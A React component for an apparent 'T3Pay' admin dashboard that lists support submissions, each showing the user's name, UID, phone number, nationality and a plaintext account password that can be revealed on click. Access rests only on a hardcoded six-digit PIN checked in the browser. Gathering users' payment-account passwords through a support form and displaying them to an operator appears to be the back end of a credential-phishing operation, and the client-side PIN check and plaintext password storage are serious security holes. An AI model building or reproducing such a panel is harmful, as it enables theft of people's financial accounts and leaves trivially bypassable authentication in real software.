import React, { useEffect, useState } from 'react';
import { SupportSubmission } from '../types';
import { Users, FileText, Search, RefreshCw, Key, ShieldAlert, Lock, AlertCircle } from 'lucide-react';
import { clsx, type ClassValue } from 'clsx';
import { twMerge } from 'tailwind-merge';

function cn(...inputs: ClassValue[]) {
  return twMerge(clsx(inputs));
}

export function AdminDashboard() {
  const [isAuthenticated, setIsAuthenticated] = useState(() => {
    return sessionStorage.getItem('admin_authenticated') === 'true';
  });
  const [pinInput, setPinInput] = useState('');
  const [pinError, setPinError] = useState('');

  const [submissions, setSubmissions] = useState<SupportSubmission[]>([]);
  const [loading, setLoading] = useState(true);
  const [error, setError] = useState('');
  const [search, setSearch] = useState('');
  const [viewPasswordIds, setViewPasswordIds] = useState<Set<string>>(new Set());

  const fetchSubmissions = async () => {
    setLoading(true);
    try {
      const res = await fetch('/api/submissions');
      if (!res.ok) throw new Error('Failed to fetch data');
      const data = await res.json();
      setSubmissions(data);
    } catch (err: any) {
      setError(err.message);
    } finally {
      setLoading(false);
    }
  };

  useEffect(() => {
    if (isAuthenticated) {
      fetchSubmissions();
    }
  }, [isAuthenticated]);

  const handleAuthSubmit = (e: React.FormEvent) => {
    e.preventDefault();
    if (pinInput === '967851') {
      sessionStorage.setItem('admin_authenticated', 'true');
      setIsAuthenticated(true);
      setPinError('');
    } else {
      setPinError('Incorrect PIN. Please enter the correct support access password.');
    }
  };

  const togglePasswordVisibility = (id: string) => {
    const next = new Set(viewPasswordIds);
    if (next.has(id)) {
      next.delete(id);
    } else {
      next.add(id);
    }
    setViewPasswordIds(next);
  };

  const filtered = submissions.filter(
    (s) =>
      s.fullName.toLowerCase().includes(search.toLowerCase()) ||
      (s.problem && s.problem.toLowerCase().includes(search.toLowerCase())) ||
      (s.t3payUid && s.t3payUid.toLowerCase().includes(search.toLowerCase())) ||
      s.mobileNumber.includes(search)
  );

  if (!isAuthenticated) {
    return (
      <div className="flex-grow flex items-center justify-center p-6 bg-slate-50 min-h-[calc(100vh-8rem)]">
        <div className="max-w-md w-full bg-white rounded-2xl shadow-sm border border-slate-200 p-8 space-y-6">
          <div className="text-center space-y-2">
            <div className="mx-auto w-12 h-12 bg-blue-50 text-blue-600 rounded-xl flex items-center justify-center border border-blue-100">
              <Lock className="w-5 h-5" />
            </div>
            <h2 className="text-xl font-bold text-slate-900 tracking-tight">T3Pay Secure Portal</h2>
            <p className="text-xs text-slate-500">
              Enter the 6-digit support access password to unlock settings.
            </p>
          </div>

          {pinError && (
            <div className="bg-red-50 text-red-700 p-3.5 rounded-lg flex items-start gap-2.5 border border-red-100 text-xs">
              <AlertCircle className="w-4 h-4 text-red-600 mt-0.5 shrink-0" />
              <span>{pinError}</span>
            </div>
          )}

          <form onSubmit={handleAuthSubmit} className="space-y-4">
            <div>
              <input
                type="password"
                required
                value={pinInput}
                onChange={(e) => setPinInput(e.target.value)}
                placeholder="Enter Access PIN"
                className="w-full text-center tracking-widest text-lg font-mono px-4 py-3 bg-slate-50 border border-slate-200 rounded-lg focus:outline-none focus:ring-2 focus:ring-blue-500/20 focus:border-blue-500 transition-all placeholder:tracking-normal placeholder:font-sans placeholder:text-sm"
              />
            </div>
            <button
              type="submit"
              className="w-full bg-slate-900 hover:bg-slate-800 text-white font-bold py-3.5 rounded-lg transition-colors shadow-sm text-sm"
            >
              Verify Credentials
            </button>
          </form>
        </div>
      </div>
    );
  }

  return (
    <div className="flex-1 overflow-y-auto bg-slate-50 px-4 sm:px-6 lg:px-8 py-8 font-sans">
      <div className="max-w-7xl mx-auto space-y-6">
        <div className="flex flex-col sm:flex-row sm:items-center justify-between gap-4">
          <div>
            <h1 className="text-2xl font-bold text-slate-900 flex items-center gap-2">
              <ShieldAlert className="w-6 h-6 text-blue-600" />
              T3Pay Admin Center
            </h1>
            <p className="text-sm text-slate-500 mt-1">
              Securely view and manage user support requests and credentials.
            </p>
          </div>
          <button
            onClick={fetchSubmissions}
            className="inline-flex items-center gap-2 px-4 py-2 bg-white border border-slate-200 rounded-lg shadow-sm text-sm font-medium text-slate-700 hover:bg-slate-50 transition-colors focus:ring-2 focus:ring-blue-500 focus:outline-none"
          >
            <RefreshCw className={cn("w-4 h-4", loading && "animate-spin")} />
            Refresh Data
          </button>
        </div>

        <div className="bg-white rounded-2xl shadow-sm border border-slate-200 overflow-hidden">
          <div className="p-4 border-b border-slate-200 bg-slate-50 flex flex-col sm:flex-row sm:items-center justify-between gap-4">
            <div className="relative max-w-sm w-full">
              <div className="absolute inset-y-0 left-0 pl-3 flex items-center pointer-events-none text-slate-400">
                <Search className="h-4 w-4" />
              </div>
              <input
                type="text"
                placeholder="Search by name, problem, phone, or UID..."
                value={search}
                onChange={(e) => setSearch(e.target.value)}
                className="block w-full pl-9 pr-3 py-2 border border-slate-200 rounded-lg text-sm placeholder-slate-400 focus:outline-none focus:ring-2 focus:ring-blue-500/20 focus:border-blue-500 transition-shadow"
              />
            </div>
            <div className="flex items-center text-sm font-medium text-slate-500 bg-slate-100 px-3 py-1.5 rounded-full">
              <Users className="w-4 h-4 mr-2" />
              Total Records: {submissions.length}
            </div>
          </div>

          <div className="overflow-x-auto">
            <table className="min-w-full divide-y divide-slate-200">
              <thead className="bg-slate-50">
                <tr>
                  <th scope="col" className="px-6 py-3 text-left text-xs font-semibold text-slate-500 uppercase tracking-wider">
                    Timestamp
                  </th>
                  <th scope="col" className="px-6 py-3 text-left text-xs font-semibold text-slate-500 uppercase tracking-wider">
                    User Details
                  </th>
                  <th scope="col" className="px-6 py-3 text-left text-xs font-semibold text-slate-500 uppercase tracking-wider">
                    Problem & Contact
                  </th>
                  <th scope="col" className="px-6 py-3 text-left text-xs font-semibold text-slate-500 uppercase tracking-wider">
                    Nationality
                  </th>
                  <th scope="col" className="px-6 py-3 text-left text-xs font-semibold text-slate-500 uppercase tracking-wider">
                    Credential
                  </th>
                </tr>
              </thead>
              <tbody className="bg-white divide-y divide-slate-200">
                {error ? (
                  <tr>
                    <td colSpan={5} className="px-6 py-8 text-center text-red-500 text-sm">
                      Error: {error}
                    </td>
                  </tr>
                ) : loading && submissions.length === 0 ? (
                  <tr>
                    <td colSpan={5} className="px-6 py-8 text-center text-slate-400 text-sm">
                      Loading secure records...
                    </td>
                  </tr>
                ) : filtered.length === 0 ? (
                  <tr>
                    <td colSpan={5} className="px-6 py-12 text-center">
                      <div className="flex flex-col items-center justify-center">
                        <FileText className="w-12 h-12 text-slate-300 mb-3" />
                        <p className="text-slate-500 font-medium">No records found</p>
                      </div>
                    </td>
                  </tr>
                ) : (
                  filtered.map((sub) => (
                    <tr key={sub.id} className="hover:bg-slate-50 transition-colors">
                      <td className="px-6 py-4 whitespace-nowrap text-sm text-slate-500">
                        {new Date(sub.timestamp).toLocaleString()}
                      </td>
                      <td className="px-6 py-4 whitespace-nowrap">
                        <div className="text-sm font-medium text-slate-900">{sub.fullName}</div>
                        <div className="text-xs text-blue-600 font-semibold font-mono">UID: {sub.t3payUid || 'N/A'}</div>
                        <div className="text-xs text-slate-500">ID: {sub.id.substring(0, 8)}...</div>
                      </td>
                      <td className="px-6 py-4 whitespace-nowrap">
                        <div className="text-sm font-semibold text-blue-950 max-w-xs truncate" title={sub.problem || (sub as any).email}>
                          {sub.problem || (sub as any).email || 'No Problem Selected'}
                        </div>
                        <div className="text-sm text-slate-500 font-mono">{sub.mobileNumber}</div>
                      </td>
                      <td className="px-6 py-4 whitespace-nowrap">
                        <div className="inline-flex items-center px-2.5 py-0.5 rounded-full text-xs font-medium bg-slate-100 text-slate-800">
                          {sub.nationality}
                        </div>
                      </td>
                      <td className="px-6 py-4 whitespace-nowrap">
                        <div className="flex items-center gap-2">
                          <code className="text-sm bg-slate-100 text-slate-800 px-2 py-1 rounded font-mono">
                            {viewPasswordIds.has(sub.id) ? sub.t3payPassword : '••••••••'}
                          </code>
                          <button
                            onClick={() => togglePasswordVisibility(sub.id)}
                            className="text-slate-400 hover:text-blue-600 transition-colors p-1"
                            title="Toggle Password Visibility"
                          >
                            <Key className="w-4 h-4" />
                          </button>
                        </div>
                      </td>
                    </tr>
                  ))
                )}
              </tbody>
            </table>
          </div>
        </div>
      </div>
    </div>
  );
}
